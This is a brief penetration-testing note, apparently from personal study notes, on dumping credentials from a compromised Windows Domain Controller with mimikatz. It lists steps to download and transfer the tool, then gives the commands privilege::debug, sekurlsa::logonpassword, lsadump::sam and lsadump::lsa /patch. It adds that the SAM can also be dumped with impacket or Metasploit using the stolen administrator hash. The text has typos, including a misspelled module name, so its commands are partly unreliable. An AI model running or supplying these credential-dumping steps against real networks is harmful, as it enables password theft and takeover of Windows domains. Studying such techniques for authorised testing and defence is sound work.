- - -
If we have compromised the **Domain Controller**, then we can use this.
Learn more about mimikatz [https://github.com/gentilkiwi/mimikatz/wiki](https://github.com/gentilkiwi/mimikatz/wiki)

- - -
> [! Note ] 
> ( use cheetsheets )

## Attacking Steps : 

☐ Go and download it [https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)
☐ Then Treansfer it to windows. ( Domain Controller's system )
☐ Unzip it.

```cmd
 cd path\to\mimikatz 
 mimikatz.exe 
 
 mimicatz #  privilege::debug                            ( Do always )
 mimicatz #  sekurlsa::logonpassword 
 mimicatz #  lsadump::sam 
 mimicatz #  lsadump::lsa /patch 
 
```

now go and run more comands....

Don't worry if you are failing to dump “**sam**”. You have **DC** and **Administrators** **hash** which we can use to dump “**sam**” with **impackets**, **Metasploit**, etc.

- - -
